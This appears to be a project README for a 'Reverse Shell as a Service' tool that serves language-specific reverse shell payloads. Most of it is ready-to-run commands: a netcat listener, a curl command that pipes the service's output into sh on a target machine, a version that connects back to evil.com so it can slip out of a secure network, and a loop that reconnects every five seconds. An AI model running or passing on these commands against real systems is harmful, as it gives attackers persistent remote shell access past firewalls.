# Reverse Shell as a Service

> https://r.0x7359.com

Easy to remember reverse shell that should work on most Unix-like systems.

Detects available software on the target and runs an appropriate payload.

This is a fork from [lukechilds' version](https://github.com/lukechilds/reverse-shell), which was made in NodeJS.

I made this in PHP, added more payloads and the function to use a specific payload.

### Payloads


- PHP, PHP2, PHP3, PHP4, PHP5, PHP6, PHP7, PHP8
- Python, python2, python3, python4
- Perl, perl2
- Socat, socat2
- Ruby, ruby2
- Bash, bash2
- Ncat, ncat2
- Telnet
- Awk
- Sh
- Go

## Usage

### 1. Listen for connection

On your machine, open up a port and listen on it. You can do this easily with netcat.

```shell
nc -l 1337
```
### 2. Execute reverse shell on target

On the target machine, pipe the output of https://r.0x7359.com/yourip:port into sh.

```shell
curl https://r.0x7359.com/192.168.0.69:1337 | sh &
```

Go back to your machine, you should now have a shell prompt.

## Demo

![rev](https://user-images.githubusercontent.com/3837916/128927456-74880809-6d84-4455-aec8-16733f90c202.gif)


## Tips

### Use a specific shell

Sometimes you may prefer some payload instead of another. In these cases, you can use https://r.0x7359.com/yourip:port:payload_name to choose the payload you want.

The names of the payloads are inside brackets before the payloads themselves.

E.g.: 
```shell
curl https://r.0x7359.com/192.168.0.69:1337:php4 | sh &
```

### Hostname

You can use a hostname instead of an IP.

```shell
curl https://r.0x7359.com/localhost:1337 | sh
```

### Remote connections

Because this is a reverse connection it can punch through firewalls and connect to the internet.

You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with:

```shell
curl https://r.0x7359.com/evil.com:1337 | sh
```

### Reconnecting

By default when the shell exits you lose your connection. You may do this by accident with an invalid command. You can easily create a shell that will attempt to reconnect at each 5 seconds by wrapping it in a while loop with a sleep. This may not work well with the python payload.

```shell
while true; do curl https://r.0x7359.com/yourip:1337 | sh; sleep 5; done
```
